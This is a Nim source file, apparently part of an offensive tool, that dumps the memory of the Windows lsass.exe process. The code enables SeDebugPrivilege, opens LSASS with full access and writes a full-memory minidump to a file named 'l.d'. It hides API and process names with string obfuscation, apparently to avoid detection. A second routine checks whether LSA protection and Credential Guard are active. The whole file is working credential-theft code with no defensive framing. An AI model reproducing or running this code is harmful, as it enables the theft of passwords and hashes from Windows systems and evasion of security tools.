import winim
import helpers
import nimprotect

proc MiniDumpWriteDump(
    process_handle: HANDLE,
    ProcessId: DWORD, 
    hFile: HANDLE, 
    DumpType: MINIDUMP_TYPE, 
    ExceptionParam: PMINIDUMP_EXCEPTION_INFORMATION, 
    UserStreamParam: PMINIDUMP_USER_STREAM_INFORMATION,
    CallbackParam: PMINIDUMP_CALLBACK_INFORMATION    
): BOOL {.importc: protectString("MiniDumpWriteDump"), dynlib: protectString("dbghelp"), stdcall.}


proc ZwQueryInformationProcess(
    processHandle: HANDLE,
    processInformationClass: PROCESSINFOCLASS, 
    processInformation: PVOID, 
    processInformationLength: ULONG, 
    returnLength: PULONG
): NTSTATUS {.importc: protectString("ZwQueryInformationProcess"), dynlib: protectString("ntdll"), stdcall.}


proc check_protection(process_h: int): int =
    
    const ProcessProtectionInformation = 61

    #[ 
    Tried to use those nested structs from
    https://learn.microsoft.com/en-us/windows/win32/procthread/zwqueryinformationprocess
    didn't really work.
    Working with single int does the job :)

    type 
        PS_PROTECTION_INNER = object
            Type {.bitsize:3.} : UCHAR  
            Audit {.bitsize:1.} : UCHAR
            Signer {.bitsize:4.} : UCHAR
        PS_PROTECTION {.union.} = object
            Level: UCHAR
            PsProtInner: PS_PROTECTION_INNER
    ]#

    var pp: int
    var temp: DWORD
    if ZwQueryInformationProcess(
        process_h,
        ProcessProtectionInformation,
        addr pp,
        cast[windef.ULONG](sizeof(pp)),
        addr temp
    ) != 0:
        # Could not retrieve
        return -1 
    
    # may be useful for future use
    # var protection_type = (pp and 0b00000111).int
    # var protection_signer = (pp shr 4).int   
    
    return pp 
    

proc dump_lsass_minidumpwritedump*(): bool =
    var is_success = false
    # set debug privileges
    if not set_privilege("SeDebugPrivilege"):
        return is_success
    let pid = get_pid(protectString("lsass.exe"))
    if not bool(pid):
        return is_success
    var process_handle = OpenProcess(PROCESS_ALL_ACCESS, false, cast[DWORD](pid))
    if not bool(process_handle):
        return is_success
    try:
        var f = open(protectString("l.d"), fmWrite)
        var success = MiniDumpWriteDump(
            process_handle,
            cast[DWORD](pid),
            f.getOsFileHandle(),
            0x00000002,
            NULL,
            NULL,
            NULL
        )
        if bool(success):
            is_success = true
        else:
            is_success = false
        f.close()
    finally:
        CloseHandle(process_handle)
        return is_success


proc examine_lsass*(): (string, string) =  

    var lsass_prot_str: string
    var lsass_credguard_str: string

    var lsass_pid = get_pid(protectString("lsass.exe"))
    var lsass_h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, cast[DWORD](lsass_pid))
    var lsass_prot = check_protection(lsass_h)
    if lsass_prot < 0:
        lsass_prot_str = protectString("Could not retrieve")
    elif lsass_prot == 0:
        lsass_prot_str = protectString("Disabled")
    else:
        lsass_prot_str = protectString("Enabled")
    CloseHandle(lsass_h)

    if get_pid(protectString("LsaIso.exe")) == 0:
        lsass_credguard_str = protectString("Disabled")
    else:
        lsass_credguard_str = protectString("Enabled")
    
    return (lsass_prot_str, lsass_credguard_str)
